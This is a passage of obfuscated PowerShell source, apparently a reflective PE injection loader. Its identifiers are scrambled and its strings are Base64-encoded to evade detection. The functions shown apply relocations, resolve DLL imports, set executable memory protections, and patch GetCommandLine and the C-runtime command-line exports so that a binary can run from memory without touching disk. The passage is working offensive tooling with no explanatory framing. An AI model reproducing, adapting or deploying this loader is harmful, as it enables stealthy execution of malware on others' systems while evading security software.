				_/===\_/\/=\/=\_/\ -_/===\/=\/==\/===\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAtAFMAZQBjAHQAaQBvAG4AcwA6ADoATQBlAG0AcwBlAHQA'))) -PEInfo ${__/\___/===\/\/=\/} -__/\/==\_/\_/\_/=\ ${__/\/==\_/\_/\_/=\} -__/\/=\____/==\/\/ ${/===\/\/\_/\/\/==} | Out-Null
				$Win32Func.memset.Invoke(${__/\/==\_/\_/\_/=\}, 0, [IntPtr]${/===\/\/\_/\/\/==}) | Out-Null
			}
		}
	}
	Function __/\/=\/=\/=\/==\/
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\___/===\/\/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[Int64]
		${___/=\/\__/=\/=\/\},
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Const,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		[Int64]${__/=\__/=\/=\/\/=} = 0
		${/=====\/\/\/===\/} = $true 
		[UInt32]${__/\_/\/\_______/} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_BASE_RELOCATION)
		if ((${___/=\/\__/=\/=\/\} -eq [Int64]${__/\___/===\/\/=\/}.EffectivePEHandle) `
				-or (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
		{
			return
		}
		elseif ((___/\___/\_/==\_/\ (${___/=\/\__/=\/=\/\}) (${__/\___/===\/\/=\/}.EffectivePEHandle)) -eq $true)
		{
			${__/=\__/=\/=\/\/=} = _____/\___/\__/\_/ (${___/=\/\__/=\/=\/\}) (${__/\___/===\/\/=\/}.EffectivePEHandle)
			${/=====\/\/\/===\/} = $false
		}
		elseif ((___/\___/\_/==\_/\ (${__/\___/===\/\/=\/}.EffectivePEHandle) (${___/=\/\__/=\/=\/\})) -eq $true)
		{
			${__/=\__/=\/=\/\/=} = _____/\___/\__/\_/ (${__/\___/===\/\/=\/}.EffectivePEHandle) (${___/=\/\__/=\/=\/\})
		}
		[IntPtr]${_/=\_/=\____/====} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
		while($true)
		{
			${/===\/===\/\/==\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/=\_/=\____/====}, [Type]$Win32Types.IMAGE_BASE_RELOCATION)
			if (${/===\/===\/\/==\/}.SizeOfBlock -eq 0)
			{
				break
			}
			[IntPtr]${/===\____/\_/\/=\} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${/===\/===\/\/==\/}.VirtualAddress))
			${__/=\______/\/\__} = (${/===\/===\/\/==\/}.SizeOfBlock - ${__/\_/\/\_______/}) / 2
			for(${/=\__/=\/\_/=\__/} = 0; ${/=\__/=\/\_/=\__/} -lt ${__/=\______/\/\__}; ${/=\__/=\/\_/=\__/}++)
			{
				${/==\/=\_/\_/=\/\/} = [IntPtr](__/\______/=\___/\ ([IntPtr]${_/=\_/=\____/====}) ([Int64]${__/\_/\/\_______/} + (2 * ${/=\__/=\/\_/=\__/})))
				[UInt16]${/==\/=\_/========} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${/==\/=\_/\_/=\/\/}, [Type][UInt16])
				[UInt16]${__/=\/===\/\__/=\} = ${/==\/=\_/========} -band 0x0FFF
				[UInt16]${/=====\/\_/=\/===} = ${/==\/=\_/========} -band 0xF000
				for (${/===\_/=\/\_/\/=\} = 0; ${/===\_/=\/\_/\/=\} -lt 12; ${/===\_/=\/\_/\/=\}++)
				{
					${/=====\/\_/=\/===} = [Math]::Floor(${/=====\/\_/=\/===} / 2)
				}
				if ((${/=====\/\_/=\/===} -eq $Win32Const.IMAGE_REL_BASED_HIGHLOW) `
						-or (${/=====\/\_/=\/===} -eq $Win32Const.IMAGE_REL_BASED_DIR64))
				{			
					[IntPtr]${_/\/==\/==\/\__/\} = [IntPtr](__/\______/=\___/\ ([Int64]${/===\____/\_/\/=\}) ([Int64]${__/=\/===\/\__/=\}))
					[IntPtr]${__/\_/\___/=\/=\_} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/\/==\/==\/\__/\}, [Type][IntPtr])
					if (${/=====\/\/\/===\/} -eq $true)
					{
						[IntPtr]${__/\_/\___/=\/=\_} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\_/\___/=\/=\_}) (${__/=\__/=\/=\/\/=}))
					}
					else
					{
						[IntPtr]${__/\_/\___/=\/=\_} = [IntPtr](_____/\___/\__/\_/ ([Int64]${__/\_/\___/=\/=\_}) (${__/=\__/=\/=\/\/=}))
					}				
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${__/\_/\___/=\/=\_}, ${_/\/==\/==\/\__/\}, $false) | Out-Null
				}
				elseif (${/=====\/\_/=\/===} -ne $Win32Const.IMAGE_REL_BASED_ABSOLUTE)
				{
					Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGsAbgBvAHcAbgAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIABmAG8AdQBuAGQALAAgAHIAZQBsAG8AYwBhAHQAaQBvAG4AIAB2AGEAbAB1AGUAOgAgACQAewAvAD0APQBcAC8APQA9AD0APQBcAC8AXABfAF8ALwBcAF8AfQAsACAAcgBlAGwAbwBjAGEAdABpAG8AbgBpAG4AZgBvADoAIAAkAHsAXwBfAF8ALwBcAC8AXAAvAFwALwBcAF8AXwAvAFwALwBcAH0A')))
				}
			}
			${_/=\_/=\____/====} = [IntPtr](__/\______/=\___/\ ([Int64]${_/=\_/=\____/====}) ([Int64]${/===\/===\/\/==\/}.SizeOfBlock))
		}
	}
	Function _/===\__/=\___/=\_
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\___/===\/\/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Func,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Types,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Const,
		[Parameter(Position = 4, Mandatory = $false)]
		[IntPtr]
		${__/\_/\__/=\/=\_/\}
		)
		${_/===\__/\_____/\} = $false
		if (${__/\___/===\/\/=\/}.PEHandle -ne ${__/\___/===\/\/=\/}.EffectivePEHandle)
		{
			${_/===\__/\_____/\} = $true
		}
		if (${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
		{
			[IntPtr]${__/\_/\/\/\_/====} = __/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
			while ($true)
			{
				${__/\/\/\_/\/\__/=} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/\_/\/\/\_/====}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
				if (${__/\/\/\_/\/\__/=}.Characteristics -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.FirstThunk -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.ForwarderChain -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.Name -eq 0 `
						-and ${__/\/\/\_/\/\__/=}.TimeDateStamp -eq 0)
				{
					Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAGkAbQBwAG8AcgB0AGkAbgBnACAARABMAEwAIABpAG0AcABvAHIAdABzAA==')))
					break
				}
				${_____/==\/\______} = [IntPtr]::Zero
				${_/=\/==\/=\____/=\} = (__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.PEHandle) ([Int64]${__/\/\/\_/\/\__/=}.Name))
				${/=\_____/\_/\/\/=} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${_/=\/==\/=\____/=\})
				if (${_/===\__/\_____/\} -eq $true)
				{
					${_____/==\/\______} = _/==\/\_/=\/=\__/\ -__/\_/\__/=\/=\_/\ ${__/\_/\__/=\/=\_/\} -_/=\/==\/=\____/=\ ${_/=\/==\/=\____/=\}
				}
				else
				{
					${_____/==\/\______} = $Win32Func.LoadLibrary.Invoke(${/=\_____/\_/\/\/=})
				}
				if ((${_____/==\/\______} -eq $null) -or (${_____/==\/\______} -eq [IntPtr]::Zero))
				{
					throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAaQBtAHAAbwByAHQAaQBuAGcAIABEAEwATAAsACAARABMAEwATgBhAG0AZQA6ACAAJAB7AC8APQA9AFwAXwBfAF8ALwBcAF8AXwAvAFwALwBcAC8AXAB9AA==')))
				}
				[IntPtr]${_/==\__/=\/\/\/\_} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${__/\/\/\_/\/\__/=}.FirstThunk)
				[IntPtr]${__/=\_/===\/\_/\/} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${__/\/\/\_/\/\__/=}.Characteristics) 
				[IntPtr]${_/\____/\_/=\_/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\_/===\/\_/\/}, [Type][IntPtr])
				while (${_/\____/\_/=\_/==} -ne [IntPtr]::Zero)
				{
					${_/===\/\_/\_/\__/} = ''
					[IntPtr]${_/==\__/\_/\__/=\} = [IntPtr]::Zero
					if([Int64]${_/\____/\_/=\_/==} -lt 0)
					{
						${_/===\/\_/\_/\__/} = [Int64]${_/\____/\_/=\_/==} -band 0xffff 
					}
					else
					{
						[IntPtr]${____/==\_/\/=\_/=} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${_/\____/\_/=\_/==})
						${____/==\_/\/=\_/=} = __/\______/=\___/\ ${____/==\_/\/=\_/=} ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
						${_/===\/\_/\_/\__/} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${____/==\_/\/=\_/=})
					}
					if (${_/===\__/\_____/\} -eq $true)
					{
						[IntPtr]${_/==\__/\_/\__/=\} = __/\/=\/=\/\/\/\__ -__/\_/\__/=\/=\_/\ ${__/\_/\__/=\/=\_/\} -_/\______/\/\_/\/\ ${_____/==\/\______} -_____/=\/=\/\___/= ${_/===\/\_/\_/\__/}
					}
					else
					{
						if(${_/===\/\_/\_/\__/} -is [string])
						{
						    [IntPtr]${_/==\__/\_/\__/=\} = $Win32Func.GetProcAddr.Invoke(${_____/==\/\______}, ${_/===\/\_/\_/\__/})
						}
						else
						{
						    [IntPtr]${_/==\__/\_/\__/=\} = $Win32Func.GetProcAddrOrdinal.Invoke(${_____/==\/\______}, ${_/===\/\_/\_/\__/})
						}
					}
					if (${_/==\__/\_/\__/=\} -eq $null -or ${_/==\__/\_/\__/=\} -eq [IntPtr]::Zero)
					{
						Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TgBlAHcAIABmAHUAbgBjAHQAaQBvAG4AIAByAGUAZgBlAHIAZQBuAGMAZQAgAGkAcwAgAG4AdQBsAGwALAAgAHQAaABpAHMAIABpAHMAIABhAGwAbQBvAHMAdAAgAGMAZQByAHQAYQBpAG4AbAB5ACAAYQAgAGIAdQBnACAAaQBuACAAdABoAGkAcwAgAHMAYwByAGkAcAB0AC4AIABGAHUAbgBjAHQAaQBvAG4AOgAgACQAewBfAC8APQBcAF8AXwBfAF8ALwA9AFwAXwBfAF8ALwA9AD0AfQAuACAARABsAGwAOgAgACQAewAvAD0APQBcAF8AXwBfAC8AXABfAF8ALwBcAC8AXAAvAFwAfQA=')))
					}
					[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/==\__/\_/\__/=\}, ${_/==\__/=\/\/\/\_}, $false)
					${_/==\__/=\/\/\/\_} = __/\______/=\___/\ ([Int64]${_/==\__/=\/\/\/\_}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${__/=\_/===\/\_/\/} = __/\______/=\___/\ ([Int64]${__/=\_/===\/\_/\/}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
					[IntPtr]${_/\____/\_/=\_/==} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${__/=\_/===\/\_/\/}, [Type][IntPtr])
				}
				${__/\_/\/\/\_/====} = __/\______/=\___/\ (${__/\_/\/\/\_/====}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
			}
		}
	}
	Function ____/\_/\/=\_/\_/\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[UInt32]
		${_/=====\/==\/\/\__}
		)
		${_/\/\______/\/\/\} = 0x0
		if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_EXECUTE) -gt 0)
		{
			if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_EXECUTE_READWRITE
				}
				else
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_EXECUTE_READ
				}
			}
			else
			{
				if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_EXECUTE_WRITECOPY
				}
				else
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_EXECUTE
				}
			}
		}
		else
		{
			if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_READ) -gt 0)
			{
				if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_READWRITE
				}
				else
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_READONLY
				}
			}
			else
			{
				if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_WRITE) -gt 0)
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_WRITECOPY
				}
				else
				{
					${_/\/\______/\/\/\} = $Win32Const.PAGE_NOACCESS
				}
			}
		}
		if ((${_/=====\/==\/\/\__} -band $Win32Const.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
		{
			${_/\/\______/\/\/\} = ${_/\/\______/\/\/\} -bor $Win32Const.PAGE_NOCACHE
		}
		return ${_/\/\______/\/\/\}
	}
	Function __/\_/===\/=\_/==\
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\___/===\/\/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Func,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Const,
		[Parameter(Position = 3, Mandatory = $true)]
		[System.Object]
		$Win32Types
		)
		for( ${/=\__/=\/\_/=\__/} = 0; ${/=\__/=\/\_/=\__/} -lt ${__/\___/===\/\/=\/}.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; ${/=\__/=\/\_/=\__/}++)
		{
			[IntPtr]${____/==\_/=\_/\/\} = [IntPtr](__/\______/=\___/\ ([Int64]${__/\___/===\/\/=\/}.SectionHeaderPtr) (${/=\__/=\/\_/=\__/} * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
			${/=====\/\/=\__/=\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${____/==\_/=\_/\/\}, [Type]$Win32Types.IMAGE_SECTION_HEADER)
			[IntPtr]${/==\/\/====\_____} = __/\______/=\___/\ (${__/\___/===\/\/=\/}.PEHandle) (${/=====\/\/=\__/=\}.VirtualAddress)
			[UInt32]${__/=\/=====\/\__/} = ____/\_/\/=\_/\_/\ ${/=====\/\/=\__/=\}.Characteristics
			[UInt32]${/=\___/=\/=\/\__/} = ${/=====\/\/=\__/=\}.VirtualSize
			[UInt32]${__/=\_/=\_/\/\/=\} = 0
			_/===\_/\/=\/=\_/\ -_/===\/=\/==\/===\ $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUALQBNAGUAbQBvAHIAeQBQAHIAbwB0AGUAYwB0AGkAbwBuAEYAbABhAGcAcwA6ADoAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0AA=='))) -PEInfo ${__/\___/===\/\/=\/} -__/\/==\_/\_/\_/=\ ${/==\/\/====\_____} -__/\/=\____/==\/\/ ${/=\___/=\/=\/\__/} | Out-Null
			${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${/==\/\/====\_____}, ${/=\___/=\/=\/\__/}, ${__/=\/=====\/\__/}, [Ref]${__/=\_/=\_/\/\/=\})
			if (${__/=====\__/\__/\} -eq $false)
			{
				Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGgAYQBuAGcAZQAgAG0AZQBtAG8AcgB5ACAAcAByAG8AdABlAGMAdABpAG8AbgA=')))
			}
		}
	}
	Function _/==\_/\/==\_/=\__
	{
		Param(
		[Parameter(Position = 0, Mandatory = $true)]
		[System.Object]
		${__/\___/===\/\/=\/},
		[Parameter(Position = 1, Mandatory = $true)]
		[System.Object]
		$Win32Func,
		[Parameter(Position = 2, Mandatory = $true)]
		[System.Object]
		$Win32Const,
		[Parameter(Position = 3, Mandatory = $true)]
		[String]
		${__/\/\__/\__/===\_},
		[Parameter(Position = 4, Mandatory = $true)]
		[IntPtr]
		${__/\/==\_/\__/\/==}
		)
		${___/=\/=\_/\__/==} = @() 
		${____/\__/\_/==\/=} = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
		[UInt32]${__/=\_/=\_/\/\/=\} = 0
		[IntPtr]${_/\/=\/\/\/===\/\} = $Win32Func.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyAC4AZABsAGwA'))))
		if (${_/\/=\/\/\/===\/\} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAMwAyACAAaABhAG4AZABsAGUAIABuAHUAbABsAA==')))
		}
		[IntPtr]${/==\/==\/\_/\___/} = $Win32Func.GetModuleHandle.Invoke($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAuAGQAbABsAA=='))))
		if (${/==\/==\/\_/\___/} -eq [IntPtr]::Zero)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SwBlAHIAbgBlAGwAQgBhAHMAZQAgAGgAYQBuAGQAbABlACAAbgB1AGwAbAA=')))
		}
		${_/=========\/===\} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/\__/\__/===\_})
		${/===\_/=\__/=\___} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\/\__/\__/===\_})
		[IntPtr]${__/=\___/=\_/\___} = $Win32Func.GetProcAddr.Invoke(${/==\/==\/\_/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAEEA'))))
		[IntPtr]${/==\/=======\_/==} = $Win32Func.GetProcAddr.Invoke(${/==\/==\/\_/\___/}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlAFcA'))))
		if (${__/=\___/=\_/\___} -eq [IntPtr]::Zero -or ${/==\/=======\_/==} -eq [IntPtr]::Zero)
		{
			throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAQwBvAG0AbQBhAG4AZABMAGkAbgBlACAAcAB0AHIAIABuAHUAbABsAC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAQQA6ACAAJAB7AC8APQBcAC8APQA9AFwALwA9AD0AXAAvAD0AXABfAC8APQB9AC4AIABHAGUAdABDAG8AbQBtAGEAbgBkAEwAaQBuAGUAVwA6ACAAJAB7AC8APQA9AD0AXABfAF8AXwBfAC8AXAAvAFwAXwAvAD0APQB9AA==')))
		}
		[Byte[]]${_/=\/\/=\__/\_/\_} = @()
		if (${____/\__/\_/==\/=} -eq 8)
		{
			${_/=\/\/=\__/\_/\_} += 0x48	
		}
		${_/=\/\/=\__/\_/\_} += 0xb8
		[Byte[]]${______/\___/\_/==} = @(0xc3)
		${/===\__/==\/====\} = ${_/=\/\/=\__/\_/\_}.Length + ${____/\__/\_/==\/=} + ${______/\___/\_/==}.Length
		${/==\/\_/\/\/\_/\/} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/===\__/==\/====\})
		${/=\/\_/\/===\/\/\} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${/===\__/==\/====\})
		$Win32Func.memcpy.Invoke(${/==\/\_/\/\/\_/\/}, ${__/=\___/=\_/\___}, [UInt64]${/===\__/==\/====\}) | Out-Null
		$Win32Func.memcpy.Invoke(${/=\/\_/\/===\/\/\}, ${/==\/=======\_/==}, [UInt64]${/===\__/==\/====\}) | Out-Null
		${___/=\/=\_/\__/==} += ,(${__/=\___/=\_/\___}, ${/==\/\_/\/\/\_/\/}, ${/===\__/==\/====\})
		${___/=\/=\_/\__/==} += ,(${/==\/=======\_/==}, ${/=\/\_/\/===\/\/\}, ${/===\__/==\/====\})
		[UInt32]${__/=\_/=\_/\/\/=\} = 0
		${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${__/=\___/=\_/\___}, [UInt32]${/===\__/==\/====\}, [UInt32]($Win32Const.PAGE_EXECUTE_READWRITE), [Ref]${__/=\_/=\_/\/\/=\})
		if (${__/=====\__/\__/\} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${_/\/=\/\_/===\__/} = ${__/=\___/=\_/\___}
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/=\/\/=\__/\_/\_} -____/\/====\__/==\ ${_/\/=\/\_/===\__/}
		${_/\/=\/\_/===\__/} = __/\______/=\___/\ ${_/\/=\/\_/===\__/} (${_/=\/\/=\__/\_/\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/===\_/=\__/=\___}, ${_/\/=\/\_/===\__/}, $false)
		${_/\/=\/\_/===\__/} = __/\______/=\___/\ ${_/\/=\/\_/===\__/} ${____/\__/\_/==\/=}
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${______/\___/\_/==} -____/\/====\__/==\ ${_/\/=\/\_/===\__/}
		$Win32Func.VirtualProtect.Invoke(${__/=\___/=\_/\___}, [UInt32]${/===\__/==\/====\}, [UInt32]${__/=\_/=\_/\/\/=\}, [Ref]${__/=\_/=\_/\/\/=\}) | Out-Null
		[UInt32]${__/=\_/=\_/\/\/=\} = 0
		${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${/==\/=======\_/==}, [UInt32]${/===\__/==\/====\}, [UInt32]($Win32Const.PAGE_EXECUTE_READWRITE), [Ref]${__/=\_/=\_/\/\/=\})
		if (${__/=====\__/\__/\} = $false)
		{
			throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
		}
		${/==\/===\_/\__/=\} = ${/==\/=======\_/==}
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${_/=\/\/=\__/\_/\_} -____/\/====\__/==\ ${/==\/===\_/\__/=\}
		${/==\/===\_/\__/=\} = __/\______/=\___/\ ${/==\/===\_/\__/=\} (${_/=\/\/=\__/\_/\_}.Length)
		[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/=========\/===\}, ${/==\/===\_/\__/=\}, $false)
		${/==\/===\_/\__/=\} = __/\______/=\___/\ ${/==\/===\_/\__/=\} ${____/\__/\_/==\/=}
		___/===\_/\/=\__/\ -_/====\____/\___/\ ${______/\___/\_/==} -____/\/====\__/==\ ${/==\/===\_/\__/=\}
		$Win32Func.VirtualProtect.Invoke(${/==\/=======\_/==}, [UInt32]${/===\__/==\/====\}, [UInt32]${__/=\_/=\_/\/\/=\}, [Ref]${__/=\_/=\_/\/\/=\}) | Out-Null
		${/=\/\/\/=\/\/=\/=} = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQBkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMABkAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAGQALgBkAGwAbAA='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMAAuAGQAbABsAA=='))) `
			, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADcAMQAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADgAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADkAMAAuAGQAbABsAA=='))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMAAwAC4AZABsAGwA'))), $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAHYAYwByADEAMQAwAC4AZABsAGwA'))))
		foreach (${_/=\__/===\/=\/\_} in ${/=\/\/\/=\/\/=\/=})
		{
			[IntPtr]${_/=\_/=\_/=\__/=\} = $Win32Func.GetModuleHandle.Invoke(${_/=\__/===\/=\/\_})
			if (${_/=\_/=\_/=\__/=\} -ne [IntPtr]::Zero)
			{
				[IntPtr]${_/===\_/=\_/=\_/\} = $Win32Func.GetProcAddr.Invoke(${_/=\_/=\_/=\__/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwB3AGMAbQBkAGwAbgA='))))
				[IntPtr]${_____/===\/\___/=} = $Win32Func.GetProcAddr.Invoke(${_/=\_/=\_/=\__/=\}, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XwBhAGMAbQBkAGwAbgA='))))
				if (${_/===\_/=\_/=\_/\} -eq [IntPtr]::Zero -or ${_____/===\/\___/=} -eq [IntPtr]::Zero)
				{
					$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACwAIABjAG8AdQBsAGQAbgAnAHQAIABmAGkAbgBkACAAXwB3AGMAbQBkAGwAbgAgAG8AcgAgAF8AYQBjAG0AZABsAG4A')))
				}
				${_/\_/=\_/\____/\_} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi(${__/\/\__/\__/===\_})
				${/===\_/====\/\__/} = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni(${__/\/\__/\__/===\_})
				${___/\____/\/\/\/\} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_____/===\/\___/=}, [Type][IntPtr])
				${/=\____/\/\__/=\/} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${_/===\_/=\_/=\_/\}, [Type][IntPtr])
				${/==\_________/=\_} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/\__/\_/==\/=})
				${__/\/====\__/\_/=} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${____/\__/\_/==\/=})
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${___/\____/\/\/\/\}, ${/==\_________/=\_}, $false)
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${/=\____/\/\__/=\/}, ${__/\/====\__/\_/=}, $false)
				${___/=\/=\_/\__/==} += ,(${_____/===\/\___/=}, ${/==\_________/=\_}, ${____/\__/\_/==\/=})
				${___/=\/=\_/\__/==} += ,(${_/===\_/=\_/=\_/\}, ${__/\/====\__/\_/=}, ${____/\__/\_/==\/=})
				${__/=====\__/\__/\} = $Win32Func.VirtualProtect.Invoke(${_____/===\/\___/=}, [UInt32]${____/\__/\_/==\/=}, [UInt32]($Win32Const.PAGE_EXECUTE_READWRITE), [Ref]${__/=\_/=\_/\/\/=\})
				if (${__/=====\__/\__/\} = $false)
				{
					throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAFYAaQByAHQAdQBhAGwAUAByAG8AdABlAGMAdAAgAGYAYQBpAGwAZQBkAA==')))
				}
				[System.Runtime.InteropServices.Marshal]::StructureToPtr(${_/\_/=\_/\____/\_}, ${_____/===\/\___/=}, $false)
